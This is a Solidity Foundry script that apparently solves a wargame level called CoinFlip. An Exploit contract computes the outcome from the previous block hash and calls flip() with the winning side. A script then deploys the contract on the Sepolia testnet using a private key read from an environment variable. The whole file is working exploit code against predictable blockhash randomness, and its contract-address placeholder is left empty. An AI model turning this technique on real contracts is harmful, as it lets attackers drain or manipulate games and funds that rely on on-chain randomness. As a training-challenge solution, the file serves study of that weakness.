// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import the CoinFlip contract
import "../src/CoinFlip.sol";
// Import the Script and console libraries from forge-std
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Define the Exploit contract
contract Exploit {
    // Define a constant FACTOR used for calculating the flip
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Define the constructor which takes a CoinFlip contract instance as a parameter
    constructor(CoinFlip _coinFlipInstance) {
        // Get the blockhash of the previous block
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // Calculate the flip based on the blockValue and FACTOR
        uint256 flip = blockValue / FACTOR;

        // Determine the winning side based on the flip
        bool winningSide = flip == 1 ? true : false;

        // Call the flip function on the CoinFlip contract instance with the winning side
        _coinFlipInstance.flip(winningSide);
    }
}

// Define the CoinFlipSolution contract which extends the Script contract
contract CoinFlipSolution is Script {
    // Define the coinflipInstance variable which is a CoinFlip contract instance. Insert your contract address here
    CoinFlip public coinflipInstance = CoinFlip();

    // Define the run function which is called externally
    function run() external {
        // Start broadcasting transactions using the SEPOLIA_KEY environment variable
        vm.startBroadcast(vm.envUint("SEPOLIA_KEY"));

        // Create a new instance of the Exploit contract with the coinflipInstance
        new Exploit(coinflipInstance);

        // Log the number of consecutive wins on the CoinFlip contract
        console.log("consecutiveWins: ", coinflipInstance.consecutiveWins());

        // Stop broadcasting transactions
        vm.stopBroadcast();
    }
}
